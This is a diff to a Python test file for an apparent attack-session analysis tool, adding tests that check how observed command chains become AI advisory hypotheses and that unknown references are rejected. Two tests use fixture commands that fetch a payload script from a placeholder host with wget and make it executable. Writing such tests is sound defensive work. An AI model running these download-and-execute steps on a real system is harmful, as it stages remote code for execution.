@@ -23,6 +23,7 @@ from production.ai_advisory.projection import (
 from production.ai_advisory.rendering import render_validated_advisory
 from production.ai_advisory.security import ProviderAliasScope
 from production.reporting.session_assessment_v4 import build_session_assessment_v4
+from tests.test_observed_attempt_hypothesis_revision import _case
 from production.reporting.typed_semantic_family_selection import (
     ACTIVATED_FAMILIES,
 )
@@ -100,6 +101,32 @@ def test_partial_typed_relationship_is_preserved_in_ai_projection() -> None:
     assert validate_ai_advisory_projection(
         projection, policy=policy, policy_sha256=policy_sha256
     ) == projection
+
+
+def test_bounded_behavior_chain_hypothesis_is_projected_without_invented_edge() -> None:
+    _facts, report = _case("ai-bounded-attempt", [
+        ("wget https://example.invalid/payload.sh -O /tmp/payload.sh", "unknown"),
+        ("chmod 700 /tmp/payload.sh", "unknown"),
+    ])
+    assert len(report["hypothesis_sets"]) == 1
+    assert report["hypothesis_sets"][0]["relationship_refs"][0].startswith("behavior_chain_")
+    policy, digest, _ = load_ai_advisory_policy()
+    projection = build_ai_advisory_projection(report, policy=policy, policy_sha256=digest)
+    assert len(projection["hypotheses"]) == 2
+    assert all(item["relationship_refs"] == [] for item in projection["hypotheses"])
+    assert any(item["evidence_refs"] for item in projection["hypotheses"])
+    assert validate_ai_advisory_projection(projection, policy=policy, policy_sha256=digest) == projection
+
+
+def test_unrecognized_hypothesis_reference_still_fails_closed() -> None:
+    _facts, report = _case("ai-invalid-chain-ref", [
+        ("wget https://example.invalid/payload.sh -O /tmp/payload.sh", "unknown"),
+        ("chmod 700 /tmp/payload.sh", "unknown"),
+    ])
+    report["hypothesis_sets"][0]["relationship_refs"] = ["untrusted_reference"]
+    policy, digest, _ = load_ai_advisory_policy()
+    with pytest.raises(AIAdvisoryContractError):
+        build_ai_advisory_projection(report, policy=policy, policy_sha256=digest)
 
 
 def _context() -> tuple[dict, dict, dict, str]:
